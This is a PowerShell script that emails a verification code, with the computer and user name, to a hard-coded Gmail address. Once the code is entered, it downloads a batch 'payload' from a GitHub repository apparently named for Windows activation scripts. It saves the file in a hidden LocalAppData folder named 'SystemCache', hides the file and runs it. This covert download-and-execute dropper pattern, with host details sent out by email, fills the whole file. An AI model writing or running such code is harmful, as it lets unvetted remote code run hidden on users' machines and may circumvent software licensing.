[CmdletBinding()]
param (
    [Parameter(Mandatory = $false)]
    [string]$Url = "https://raw.githubusercontent.com/DevJeffersonL/MAS/6257eca084d95d777f9a8a1cb9a1fc805d5cce48/main.bat",

    [Parameter(Mandatory = $false)]
    [string]$FolderName = "SystemCache",

    [Parameter(Mandatory = $false)]
    [string]$FileName = "main.bat",

    [Parameter(Mandatory = $false)]
    [string]$NotifyEmail = "jeffersonlakashiang@gmail.com",

    [Parameter(Mandatory = $false)]
    [switch]$Wait
)

# -------------------------------------------------------------------------
# Step 0: Two-Step Verification (Email OTP)
# -------------------------------------------------------------------------

# Generate a cryptographically random 6-digit numeric OTP
$otp = (Get-Random -Minimum 100000 -Maximum 999999).ToString()

function Send-VerificationOtp {
    param (
        [string]$RecipientEmail,
        [string]$Code
    )

    # SMTP Configuration (Requires a Gmail account with an App Password)
    $smtpServer = "smtp.gmail.com"
    $smtpPort   = 587
    $senderUser = "YOUR_SENDER_EMAIL@gmail.com"     # The sending Gmail account
    $appPassword = "YOUR_16_DIGIT_APP_PASSWORD"     # Generated Gmail App Password

    $mailMessage = New-Object System.Net.Mail.MailMessage
    $mailMessage.From = New-Object System.Net.Mail.MailAddress($senderUser, "Script Authorization")
    $mailMessage.To.Add($RecipientEmail)
    $mailMessage.Subject = "Your Execution Verification Code: $Code"
    $mailMessage.Body = @"
A request was made to execute the setup script on machine: $env:COMPUTERNAME
User account: $env:USERNAME

Your one-time authorization code is: $Code

This code is valid for this session only. If you did not initiate this request, take immediate action to secure your machine.
"@

    $smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
    $smtpClient.EnableSsl = $true
    $smtpClient.Credentials = New-Object System.Net.NetworkCredential($senderUser, $appPassword)

    try {
        Write-Host "Sending authorization code to $RecipientEmail..." -ForegroundColor Cyan
        $smtpClient.Send($mailMessage)
        Write-Host "Verification email sent successfully." -ForegroundColor Green
    }
    catch {
        throw "Failed to dispatch verification email: $($_.Exception.Message)"
    }
    finally {
        $mailMessage.Dispose()
        $smtpClient.Dispose()
    }
}

try {
    # Dispatch OTP
    Send-VerificationOtp -RecipientEmail $NotifyEmail -Code $otp

    # Prompt user for code with 3 attempts
    $authenticated = $false
    $maxAttempts = 3
    $attempts = 0

    while (-not $authenticated -and $attempts -lt $maxAttempts) {
        $attempts++
        $inputCode = Read-Host "Enter the 6-digit verification code sent to $NotifyEmail (Attempt $attempts of $maxAttempts)"
        
        if ($inputCode.Trim() -eq $otp) {
            $authenticated = $true
            Write-Host "Verification successful. Access granted." -ForegroundColor Green
        } else {
            Write-Warning "Invalid code. Please try again."
        }
    }

    if (-not $authenticated) {
        throw "Maximum authentication attempts exceeded. Execution terminated."
    }
}
catch {
    Write-Error "Authentication Error: $($_.Exception.Message)"
    exit 1
}

# -------------------------------------------------------------------------
# Step 1: Payload Download & Execution (Runs only if verified)
# -------------------------------------------------------------------------

# 1. Enforce TLS 1.2+ negotiation for GitHub endpoints
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# 2. Construct paths targeting a hidden subfolder in LocalAppData
$basePath        = $env:LOCALAPPDATA
$targetDirectory = Join-Path -Path $basePath -ChildPath $FolderName
$destinationPath = Join-Path -Path $targetDirectory -ChildPath $FileName

try {
    # 3. Create target directory if it does not already exist
    if (-not (Test-Path -LiteralPath $targetDirectory)) {
        $folder = New-Item -Path $targetDirectory -ItemType Directory -Force -ErrorAction Stop
        $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
        Write-Verbose "Created hidden directory at: $targetDirectory"
    }

    Write-Host "Downloading payload from $Url..." -ForegroundColor Cyan

    # 4. Download file directly with strict error termination
    $webParams = @{
        Uri             = $Url
        OutFile         = $destinationPath
        UseBasicParsing = $true
        ErrorAction     = 'Stop'
        TimeoutSec      = 30
    }
    Invoke-WebRequest @webParams

    # 5. Validate file integrity and size
    if (-not (Test-Path -LiteralPath $destinationPath)) {
        throw "File download failed; target destination does not exist."
    }

    $fileItem = Get-Item -LiteralPath $destinationPath -Force
    if ($fileItem.Length -eq 0) {
        throw "Downloaded payload is empty (0 bytes)."
    }

    # 6. Apply Hidden attribute to the downloaded batch file
    $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::Hidden
    Write-Host "Payload saved and flagged as Hidden: $destinationPath" -ForegroundColor Green

    # 7. Execute the batch file
    Write-Host "Launching process..." -ForegroundColor Cyan
    $processParams = @{
        FilePath = $destinationPath
    }

    if ($Wait) {
        $processParams['Wait'] = $true
        $processParams['PassThru'] = $true
        $proc = Start-Process @processParams
        Write-Host "Process finished with exit code: $($proc.ExitCode)" -ForegroundColor Green
    } else {
        Start-Process @processParams
        Write-Host "Process launched successfully in a new window." -ForegroundColor Green
    }
}
catch {
    Write-Error "Execution error: $($_.Exception.Message)"
}
